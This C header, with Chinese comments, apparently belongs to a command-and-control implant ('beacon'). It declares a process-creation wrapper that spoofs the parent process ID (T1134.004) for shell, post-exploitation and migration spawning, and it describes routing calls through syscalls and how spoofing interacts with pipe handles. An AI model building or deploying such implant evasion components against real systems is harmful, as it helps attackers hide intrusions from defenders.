#pragma once

#include "beacon_common.h"
#include "beacon_api.h"

/*
 * beacon_spawn.h -- 统一进程创建入口（PPID 欺骗插件）。
 *
 * 所有需要拉子进程的模块（shell / postex spawn / migrate spawn）汇聚到
 * SpawnCreateProcess：ppid=0 时直通 pfnCreateProcessW（零开销）；
 * ppid>0 时通过 STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
 * 把子进程的"父进程"指向指定 PID（T1134.004）。
 *
 * 实现移植自参考项目 D:\code\Vs2022\PPID-Spoofing\ppid_spoof.c，
 * 按本项目风格改造：API 走 Win32Api 表槽位（OpenProcess 走 pfnNtOpenProcess，
 * 跟随全局 syscall 开关），错误统一走 err 缓冲。
 *
 * 注意：
 *  - 只伪造血缘，不伪造身份：子进程 token 仍是调用者的；
 *  - Kernel-Process ETW 记录真实创建关系（能力边界，不宣称绕过）；
 *  - PARENT_PROCESS 时 STARTF_USESTDHANDLES 按假父句柄表解释：调用方管道
 *    必须 DuplicateHandle 进假父，si.hStd* 填父进程句柄值；创建成功后立刻
 *    关掉假父里的拷贝，否则管道写端残留、读端不会 EOF。
 */

/* 进程创建策略选项 */
typedef struct SpawnOptions {
    UINT32 ppid;              /* 目标父进程 PID；0 = 不欺骗 */
    BOOL   fallback_plain;    /* spoof 失败时回退普通创建（默认 TRUE） */
} SpawnOptions;

/* 统一进程创建入口（签名对齐 CreateProcessW）。
 * opt 为 NULL 或 opt->ppid==0 时直通 pfnCreateProcessW。
 * ppid>0 时内部组装 STARTUPINFOEXW：STARTF_USESTDHANDLES 的句柄复制进假父
 * 后再写入 siEx（shell 管道捕获）；spoof 失败且 fallback_plain 时回退一次，
 * 回退仍用调用方原始 si。成功返回 TRUE 并填充 pi；失败返回 FALSE 并写 err。 */
BOOL SpawnCreateProcess(const Win32Api* api,
                        const SpawnOptions* opt,
                        LPCWSTR app, LPWSTR cmdline,
                        LPSECURITY_ATTRIBUTES pa, LPSECURITY_ATTRIBUTES ta,
                        BOOL inherit, DWORD flags, LPVOID env, LPCWSTR cwd,
                        LPSTARTUPINFOW si, LPPROCESS_INFORMATION pi,
                        CHAR* err, SIZE_T err_size);

/* 全局欺骗目标配置槽（默认 0 = 不欺骗），spawn_ppid 命令读写。 */
UINT32 SpawnGetPpid(VOID);
VOID SpawnSetPpid(UINT32 ppid);

/* 应用 profile 配置的欺骗目标：spec 为进程名（explorer.exe）或数字 PID，
 * 空字符串 = 不欺骗。进程名通过 Toolhelp 快照解析（走 api 表槽位）。
 * 返回实际生效的 PID（0 = 不欺骗/解析失败）。 */
UINT32 SpawnApplyProfile(const Win32Api* api, const CHAR* spec);
